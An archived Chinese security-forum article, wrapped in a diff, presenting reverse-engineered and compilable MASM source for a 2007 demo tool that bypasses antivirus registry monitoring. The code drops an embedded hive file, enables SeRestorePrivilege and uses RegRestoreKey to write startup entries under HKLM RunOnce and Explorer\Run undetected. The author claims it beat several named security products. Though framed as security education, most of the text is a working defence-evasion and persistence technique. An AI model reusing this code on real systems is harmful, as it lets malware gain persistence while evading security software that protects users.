@@ -1,0 +1,616 @@
+
+# 注册表监控弱点演示程序 v0.2 逆向 ASM 源码及相关资料
+
+> 原文：[`www.pediy.com/kssd/pediy10/62686.html`](https://www.pediy.com/kssd/pediy10/62686.html)
+
+注册表监控弱点演示程序相关信息:
+
+[`http://www.xyzreg.net/`](http://www.xyzreg.net/)
+
+**突破主动防御之注册表监控篇** 大 | 中 | 小 [ 2007/02/26 05:17 | by `xyzreg` ]
+
+目前主动防御的概念已经深入人心，许多杀毒软件、软件防火以及 `HIPS` 都具有了注册表监控功能，防止自启动项以及 `IE` 相关键值被修改，对防范病毒木马以及流氓软件等恶意程序起到了不小的作用。但是现有的注册表监控并非无懈可击，我们仍然可以绕过注册表监控修改注册表。
+
+绕过注册表监控的方法不止一种，应根据不同情况灵活运用。 除了本演示程序使用的操作 `HIVE` 文件修改注册表的方法，我们还可以写驱动解除注册表监控程序的钩子，或者直接调用 `CmXXXXX` 等未导出函数来操作注册表等。
+
+测试了卡巴 6、瑞星 2007、`GSS`、江民 2007 等含有注册表监控功能的安全软件，我写的这个演示程序均可以突破他们不被拦截，实现修改注册表。
+
+本程序仅作科普以及安全警示之用，旨在提高大家安全意识以及选择更好的安全产品。勿将程序中的方法用于非法用途。
+
+## 直接分析的内容
+
+代码:
+
+```
+    .const
+szResourceType    db  "xyz2"
+szFileName    db  "c:\\xyz2.hiv"
+szSeRestorePrivilege  db  "SeRestorePrivilege"
+SubRegKey    db  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies"
+    .code
+SpecialPassRegMon proc uses ebx esi edi
+local  hRegKey:dword,NumberOfBytesWritten:dword
+            push    offset szResourceType    ; "xyz2"
+            push    84h        ; lpName
+            push    0        ; hModule
+            call    FindResourceA
+            mov     ebx, eax
+
+            push    eax        ; hResInfo
+            push    0        ; hModule
+            call    SizeofResource
+      mov     edi, eax
+
+            push    ebx        ; hResInfo
+            push    0        ; hModule
+            call    LoadResource
+            push    eax        ; hResData
+            call    LockResource         
+    mov     ebx, eax
+
+            push    0        ; hTemplateFile
+            push    0        ; dwFlagsAndAttributes
+            push    2        ; dwCreationDisposition
+            push    0        ; lpSecurityAttributes
+            push    0        ; dwShareMode
+            push    40000000h      ; dwDesiredAccess
+            push    offset szFileName    ; "c:\\xyz2.hiv"
+            call    CreateFileA
+            mov     esi, eax
+
+            push    0        ; lpOverlapped
+            lea     eax, NumberOfBytesWritten
+            push    eax        ; lpNumberOfBytesWritten
+            push    edi        ; nNumberOfBytesToWrite
+            push    ebx        ; lpBuffer
+            push    esi        ; hFile
+            call    WriteFile
+
+            push    esi        ; hObject
+            call    CloseHandle
+
+            push    offset szSeRestorePrivilege  ; "SeRestorePrivilege"
+            call    LookupTokenPrivilege
+
+            lea     ecx, hRegKey
+            push    ecx        ; phkResult
+            push    offset SubRegKey    ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
+            push    HKEY_LOCAL_MACHINE    ; hKey
+            call    RegOpenKeyA
+            xor     esi, esi
+@@: 
+            mov     edx, [esp+14h+hRegKey]
+            push    REG_FORCE_RESTORE    ; dwFlags
+            push    offset File      ; "C:\\xyz2.hiv"
+            push    edx        ; hKey
+            call    RegRestoreKeyA
+            test    eax, eax
+            jz      @f
+            inc     esi
+            cmp     esi, 14h
+            jl      @b
+@@:   
+            push    offset szFileName    ; "c:\\xyz2.hiv"
+            call    DeleteFileA
+            push    hRegKey        ; hObject
+            call    CloseHandle
+            ret
+SpecialPassRegMon endp
+
+BOOL __cdecl SpecialPassRegMon()
+{
+  signed int i; 
+  HRSRC hModule; 
+  HRSRC temp;
+  DWORD dwResourceSize;
+  HGLOBAL hResData;
+  HANDLE hFile;
+  const void *pResData;
+  DWORD NumberOfBytesWritten;
+  HKEY hRegKey;
+
+  hModule = FindResourceA(0, (LPCSTR)0x84, "xyz2");
+  temp = hModule;
+  dwResourceSize = SizeofResource(0, hModule);
+  hResData = LoadResource(0, temp);
+  hFile = CreateFileA("c:\\xyz2.hiv", 0x40000000u, 0, 0, 2u, 0, 0);
+  pResData = LockResource(hResData);
+  WriteFile(hFile, pResData, dwResourceSize, &NumberOfBytesWritten, 0);
+  CloseHandle(hFile);
+  LookupTokenPrivilege("SeRestorePrivilege");
+  RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies", &hRegKey);
+  i = 0;
+  do
+  {
+    if ( !RegRestoreKeyA(hRegKey, "C:\\xyz2.hiv", REG_FORCE_RESTORE) )
+      break;
+    ++i;
+  }
+  while ( i < 20 );
+  CloseHandle(hRegKey);
+  return DeleteFileA("c:\\xyz2.hiv");
+}
+
+
+LookupTokenPrivilege proc lpPrivilege:DWORD
+local  TokenHandle:dword
+local  Luid:_LUID
+local  NewState:_TOKEN_PRIVILEGES
+            lea     eax, TokenHandle
+            push    eax        ; TokenHandle
+            push    28h        ; DesiredAccess
+            call    GetCurrentProcess
+            push    eax        ; ProcessHandle
+            call    OpenProcessToken
+            test    eax, eax
+            jz      exit_LookupTokenPrivilege
+            lea     ecx, Luid
+            push    ecx        ; lpLuid
+            push    lpPrivilege      ; Privilege = "SeRestorePrivilege"
+            push    0        ; lpSystemName
+            call    LookupPrivilegeValueA 
+            test    eax, eax
+            jz  error_LookupTokenPrivilege
+            push  Luid.LowPart
+            pop     NewState.Privileges.Luid.LowPart
+            push  Luid.HighPart
+            pop     NewState.Privileges.Luid.HighPart
+            mov     NewState.PrivilegeCount, 1
+            mov     NewState.Privileges.Attributes, 2
+            push    0        ; ReturnLength
+            push    0        ; PreviousState
+            push    10h        ; BufferLength
+            lea     eax, NewState
+            push    eax        ; NewState
+            push    0        ; DisableAllPrivileges
+            push    TokenHandle      ; TokenHandle
+            call    AdjustTokenPrivileges
+            test    eax, eax
+            jnz  exit_LookupTokenPrivilege
+error_LookupTokenPrivilege:
+            push    TokenHandle      ; hObject
+            call    CloseHandle
+    xor  eax, eax
+exit_LookupTokenPrivilege:
+            ret
+LookupTokenPrivilege endp
+
+BOOL __cdecl LookupTokenPrivilege(LPCSTR lpPrivilege)
+{
+  BOOL result; 
+  HANDLE hProc;
+  HANDLE TokenHandle;
+  struct _LUID Luid;
+  struct _TOKEN_PRIVILEGES NewState;
+
+  hProc = GetCurrentProcess();
+  result = OpenProcessToken(hProc, 0x28u, &TokenHandle);
+  if ( result )
+  {
+    if ( LookupPrivilegeValueA(0, lpPrivilege, &Luid) )
+    {
+      NewState.Privileges[0].Luid.LowPart = Luid.LowPart;
+      NewState.PrivilegeCount = 1;
+      NewState.Privileges[0].Luid.HighPart = Luid.HighPart;
+      NewState.Privileges[0].Attributes = 2;
+      result = AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0, 0);
+      if ( !result )
+        result = CloseHandle(TokenHandle);
+    }
+    else
+    {
+      result = CloseHandle(TokenHandle);
+    }
+  }
+  return result;
+}
+```
+
+以下是编译通过的 ASM 源码，对代码部分进行了修改和优化
+
+代码:
+
+
+
+这是一段汇编语言（MASM）代码，包含注释、指令定义和过程体。以下是经过格式优化的代码内容：
+
+```asm
+;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+; 注册表监控弱点演示程序 v0.2  BypassRegMon_src 
+; 源 PE 作者： xyzreg  逆向优化源码 by hsq, 2007-11-7 10:29
+;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+.386
+.model flat,stdcall
+option casemap:none
+
+include    windows.inc
+include    user32.inc
+include    shell32.inc
+include    kernel32.inc
+include    advapi32.inc
+includeLib  user32.lib
+includelib  shell32.lib
+includeLib  kernel32.lib
+includelib  advapi32.lib
+     .const
+Data     db  "test.exe",0
+szXYZ2    db  "XYZ2",0
+szXYZ2_hiv   db  "c:\\XYZ2.hiv",0
+szNon    db  "NON",0
+szNon_hiv   db  "c:\\NON.hiv",0
+szXyz    db  "XYZ",0
+szXyz_hiv   db  "C:\\XYZ.hiv",0
+szSeRestorePrivilege  db  "SeRestorePrivilege",0
+szSpeciallpSubKey  dw  0
+SubRegKey   db  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies",0    
+szSoftwareMicrCurRunOnce db  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",0
+szSoftwareMicrExpRun  db  'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run',0
+Caption    db  "提示",0         
+szNormal   db  "常规方法",0   
+szClear    db  "清除完毕!",0Dh,0Ah,0
+szSpecial  db  "特殊方法",0
+szSpecial_A   db  "特殊方法修改注册表自启动项 A ...",0Dh,0Ah,0Dh,0Ah,"如果修改成功将在"
+   db  "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+   db  "下增加 ",22h,"特殊方法",22h,2ch,22h,"test.exe",22h,"的新键值",0Dh,0Ah,0Dh,0Ah
+   db  "操作完毕，请观察注册表监控类程程序是否有反应",0Dh,0Ah,0 
+szNormal_A  db  "常规方法修改注册表自启动项 A ...",0Dh,0Ah,0Dh,0Ah,"如果修改成功将在"
+   db  "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+   db  "下增加 ",22h,"常规方法",22h,2ch,22h,"test.exe",22h,"的新键值",0Dh,0Ah,0Dh,0Ah
+   db  "操作完毕，请观察注册表监控类程程序是否有反应",0Dh,0Ah,0 
+szNormal_B  db  "常规方法修改注册表自启动项 B ...",0Dh,0Ah,0Dh,0Ah,"如果修改成功将在"
+   db  "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run"
+   db  "下增加 ",22h,"常规方法",22h,2ch,22h,"test.exe",22h,"的新键值",0Dh,0Ah,0Dh,0Ah
+   db  "操作完毕，请观察注册表监控类程程序是否有反应",0Dh,0Ah,0 
+szSpecial_B db  "特殊方法修改注册表自启动项 B ...",0Dh,0Ah,0Dh,0Ah,"如果修改成功将在"
+   db  "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run"
+   db  "下增加 ",22h,"特殊方法",22h,2ch,22h,"test.exe",22h,"的新键值",0Dh,0Ah,0Dh,0Ah
+   db  "操作完毕，请观察注册表监控类程程序是否有反应",0Dh,0Ah,0 
+
+    .data?
+ghInstance   HINSTANCE  ?  ;保存实例句柄
+
+    .code
+Start:    
+  push    SW_SHOWDEFAULT     ; nShowCmd
+        push    0        ; lpCmdLine
+        push    0        ; hPrevInstance
+        push    0        ; lpModuleName
+        call    GetModuleHandle
+        push    eax        ; hInstance
+        call    WinMain        ; WinMain(x,x,x,x)
+  push  eax
+  call  ExitProcess
+;=========================================================================================
+WinMain     proc hInstance:HINSTANCE,hPrevInstance:HINSTANCE,lpCmdLine:LPSTR,nShowCmd:DWORD
+local  Msg:MSG
+  mov     eax, hInstance
+        mov     ghInstance, eax
+        push    5        ; nCmdShow
+        push    0        ; dwInitParam
+        push    offset DialogFunc    ; lpDialogFunc
+        push    0        ; hWndParent
+        push    81h        ; lpTemplateName
+        push    eax        ; hInstance
+        call    CreateDialogParam
+        push    eax        ; hWnd
+        call    ShowWindow
+        push    0        ; wMsgFilterMax
+        push    0        ; wMsgFilterMin
+        push    0        ; hWnd
+        lea     eax, Msg
+        push    eax        ; lpMsg
+        call    GetMessage
+        test    eax, eax
+        jz      short EndMSG
+WaitMSG:                 
+        lea     ecx, Msg
+        push    ecx        ; lpMsg
+        call    TranslateMessage
+        lea     edx, Msg
+        push    edx        ; lpMsg
+        call    DispatchMessage
+        push    0        ; wMsgFilterMax
+        push    0        ; wMsgFilterMin
+        push    0        ; hWnd
+        lea     eax, Msg
+        push    eax        ; lpMsg
+        call    GetMessage
+        test    eax, eax
+        jnz     short WaitMSG
+EndMSG: 
+        mov     eax, Msg.wParam
+  ret
+WinMain     endp
+
+DialogFunc    proc uses ebx edi esi hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
+        mov     eax, uMsg
+        cmp     eax, WM_CLOSE
+        jz      exit_DialogFunc
+        cmp     eax, WM_COMMAND
+        jz      short NextCOMMAND0
+  cmp  uMsg, WM_DESTROY
+  je  NextMSG
+        xor     eax, eax
+        ret
+NextMSG:
+  push  0     
+  call  PostQuitMessage                 
+  jmp  RetMSG
+NextCOMMAND0:                 
+        mov     eax, wParam
+        cmp     ax, 3FBh
+        jnz     NextCOMMAND1
+        lea     eax, uMsg
+        push    eax         
+        push    0F003Fh         
+        push    0         
+        push    offset szSoftwareMicrCurRunOnce
+        push    HKEY_LOCAL_MACHINE     
+        call    RegOpenKeyEx
+        push    offset Data
+        call    lstrlen
+        mov     ecx, uMsg
+        push    eax         
+        push    offset Data       
+        push    1         
+        push    0         
+        push    offset szNormal       
+        push    ecx         
+        call    RegSetValueExA
+        mov     edx, uMsg
+        push    edx         
+        call    RegCloseKey
+        mov     eax, hWnd
+        push    20h        ; uType       
+        push    offset Caption      ; "提示"     
+        push    offset szNormal_A    ; "常规方法修改注册表自启动项 A ..."     
+        push    eax         
+        call    MessageBox
+  jmp  RetMSG
+NextCOMMAND1:                      
+        cmp     ax, 3FCh
+        jnz     short NextCOMMAND2
+  push  REG_FORCE_RESTORE    ; dwFlags    
+        push    offset szSoftwareMicrCurRunOnce  ; lpSubKey   
+        push    HKEY_LOCAL_MACHINE    ; hKey       
+  push  offset szXyz_hiv    ; lpFilePath
+  push  offset szXyz       ; lpType     
+  push  130        ; lpName=IDD; 130 XYZ "Data_2.bin"
+  push  0        ; hModule    
+  call  SpecialPassRegMon
+        mov     ecx, hWnd
+        push    20h        ; uType
+        push    offset Caption      ; "提示"
+        push    offset szSpecial_A    ; "\\n 特殊方法修改注册表自启动项 A..."
+        push    ecx        ; hWnd
+        call    MessageBox
+  jmp  RetMSG
+NextCOMMAND2:                      
+        cmp     ax, 3FDh
+        jnz     NextCOMMAND3
+  push  REG_FORCE_RESTORE    ; dwFlags    
+        push    offset szSoftwareMicrCurRunOnce  ; lpSubKey   
+        push    HKEY_LOCAL_MACHINE    ; hKey       
+  push  offset szNon_hiv    ; lpFilePath
+  push  offset szNon       ; lpType     
+  push  131        ; lpName=IDD 131 NON "Data_1.bin"
+  push  0        ; hModule    
+  call  SpecialPassRegMon
+        push  esp
+        push    esp        ; phkResult
+        push    KEY_ALL_ACCESS      ; samDesired
+        push    0        ; ulOptions
+        push    offset szSoftwareMicrExpRun  ; "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi"...
+        push    HKEY_LOCAL_MACHINE    ; hKey
+        call    RegOpenKeyEx
+        pop  ebx
+        push    offset szNormal      ; "常规方法"
+        push    ebx        ; hKey
+        call    RegDeleteValue     ; 删除常规方法建立的键值
+        push    offset szSpecial    ; "特殊方法"
+        push    ebx        ; hKey
+        call    RegDeleteValue     ; 删除常规方法建立的键值
+        push    offset szSpeciallpSubKey  ; lpSubKey
+        push    ebx        ; hKey
+        call    RegDeleteKey
+        push    ebx        ; hKey
+        call    RegCloseKey
+        push    MB_ICONQUESTION      ; uType
+        push    offset Caption      ; "提示"
+        push    offset szClear      ; "清除完毕!"
+        push    hWnd        ; hWnd
+        call    MessageBox
+  jmp  RetMSG
+NextCOMMAND3:                      
+        cmp     ax, 400h
+        jnz     short NextMSG0
+        lea     edx, uMsg
+        push    edx        ; phkResult
+        push    offset szSoftwareMicrExpRun  ; "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersi"...
+        push    HKEY_LOCAL_MACHINE    ; hKey
+        call    RegCreateKey
+        push    offset Data
+        call    lstrlen
+        push    eax        ; cbData
+        mov     eax, uMsg
+        push    offset Data      ; lpData
+        push    1        ; dwType
+        push    0        ; Reserved
+        push    offset szNormal      ; "常规方法"
+        push    eax        ; hKey
+        call    RegSetValueEx
+        mov     ecx, uMsg
+        push    ecx        ; hKey
+        call    RegCloseKey
+        mov     edx, hWnd
+        push    MB_ICONQUESTION      ; uType
+        push    offset Caption      ; "提示"
+        push    offset szNormal_B    ; "\\n 常规方法修改注册表自启动项 B..."
+        push    edx        ; hWnd
+        call    MessageBox
+  jmp  RetMSG
+NextMSG0:
+        cmp     ax, 401h
+        jnz     exit_DialogFunc
+  push  REG_FORCE_RESTORE    ; dwFlags
+        push    offset SubRegKey    ; lpSubKey
+        push    HKEY_LOCAL_MACHINE    ; hKey
+  push  offset szXYZ2_hiv    ; lpFilePath
+  push  offset szXYZ2       ; lpType
+  push  132        ; lpName=IDD  132 XYZ2 "Data_3.bin"
+  push  0        ; hModule
+  call  SpecialPassRegMon
+        mov     eax, hWnd
+        push    20h        ; uType
+        push    offset Caption      ; "提示"
+        push    offset szSpecial_B    ; "\\n 特殊方法修改注册表自启动项 B..."
+        push    eax        ; hWnd
+        call    MessageBox
+RetMSG: 
+        mov     eax, 1
+        ret
+exit_DialogFunc:   
+  push  hWnd
+  call  DestroyWindow
+  jmp  RetMSG
+DialogFunc    endp
+
+SpecialPassRegMon proc uses ebx esi edi hModule,lpName,lpType,lpFilePath,hKey,\
+                 lpSubKey,dwFlags
+local  hRegKey:dword,NumberOfBytesWritten:dword
+        push    lpType        ; lpType   
+        push    lpName        ; lpName
+        push    hModule        ; hModule
+        call    FindResource      ; 查找资源
+        mov     ebx, eax
+
+  push    eax        ; hResInfo
+        push    hModule        ; hModule
+        call    SizeofResource      ; 获得资源大小
+  mov     edi, eax
+
+        push    ebx        ; hResInfo
+        push    hModule        ; hModule
+        call    LoadResource      ; 装载资源
+        push    eax        ; hResData
+        call    LockResource      ; 锁定资源           
+  mov     ebx, eax     ; 获取资源指针     
+
+        push    0        ; hTemplateFile
+        push    0        ; dwFlagsAndAttributes
+        push    2        ; dwCreationDisposition
+        push    0        ; lpSecurityAttributes
+        push    0        ; dwShareMode
+        push    40000000h     ; dwDesiredAccess
+        push    lpFilePath       
+        call    CreateFile      ; 创建文件
+        mov     esi, eax
+
+        push    0        ; lpOverlapped
+        lea     eax, NumberOfBytesWritten
+        push    eax        ; lpNumberOfBytesWritten
+        push    edi        ; nNumberOfBytesToWrite
+        push    ebx        ; lpBuffer
+        push    esi        ; hFile
+        call    WriteFile      ; 写文件内容
+
+        push    esi         
+        call    CloseHandle      ; 关闭文件句柄
+
+        push    offset szSeRestorePrivilege  ; "SeRestorePrivilege"
+        call    LookupTokenPrivilege    ; 提升进程权限
+
+        push  esp
+  push  esp
+        push    lpSubKey     
+        push    HKEY_LOCAL_MACHINE    ; hKey
+        call    RegOpenKey      ; 打开注册表,成功则返回零
+        pop  ebx
+  xor     esi, esi
+@@: 
+        push    dwFlags        ; dwFlags
+        push    lpFilePath       
+        push    ebx        ; hKey
+        call    RegRestoreKey      ; 写注册表,成功则返回零
+        test    eax, eax
+        jz      @f
+        inc     esi
+        cmp     esi, 3h        ; 尝试 3 次
+        jl      @b
+@@:   
+        push    lpFilePath       
+        call    DeleteFile      ; 删除释放文件
+        push    ebx       
+        call    CloseHandle
+        ret
+SpecialPassRegMon endp
+
+LookupTokenPrivilege proc lpPrivilege:DWORD
+local  TokenHandle:dword
+local  Luid:LUID
+local  NewState:TOKEN_PRIVILEGES
+  lea     eax, TokenHandle
+  push    eax        ; TokenHandle
+  push    28h        ; DesiredAccess
+  call    GetCurrentProcess
+  push    eax        ; ProcessHandle
+  call    OpenProcessToken
+  test    eax, eax
+  jz      exit_LookupTokenPrivilege
+  lea     ecx, Luid
+  push    ecx        ; lpLuid
+  push    lpPrivilege      ; Privilege = "SeRestorePrivilege"
+  push    0        ; lpSystemName
+  call    LookupPrivilegeValue
+  test    eax, eax
+  jz  error_LookupTokenPrivilege
+  push  Luid.LowPart
+  pop     NewState.Privileges.Luid.LowPart
+  push  Luid.HighPart
+  pop     NewState.Privileges.Luid.HighPart
+  mov     NewState.PrivilegeCount, 1
+  mov     NewState.Privileges.Attributes, 2
+  push    0        ; ReturnLength
+  push    0        ; PreviousState
+  push    10h        ; BufferLength
+  lea     eax, NewState
+  push    eax        ; NewState
+  push    0        ; DisableAllPrivileges
+  push    TokenHandle      ; TokenHandle
+  call    AdjustTokenPrivileges
+  test    eax, eax
+  jnz  exit_LookupTokenPrivilege
+error_LookupTokenPrivilege:
+  push    TokenHandle      ; hObject
+  call    CloseHandle
+  xor  eax, eax
+exit_LookupTokenPrivilege:
+        ret
+LookupTokenPrivilege endp
+end    Start
+```
+
+
+
+基本上操作 `HIVE` 文件的都是通过 `SpecialPassRegMon` 实现，问题的核心是如何编写 `HIVE` 文件。虽然目前的 `KAV7.0.1.325` 版封了 `HIVE` 写注册表，但是最后一种些注册表的方法依然可行，
+
+估计迟早也要 X 掉。
+
+上传的附件
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `BypassRegMon2.idb.rar`
+
+|
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `BypassRegMon.rar`
+
+|
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `HIVE 格式.rar`
+
+|
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `BypassRegMon_src.rar`
+
+|
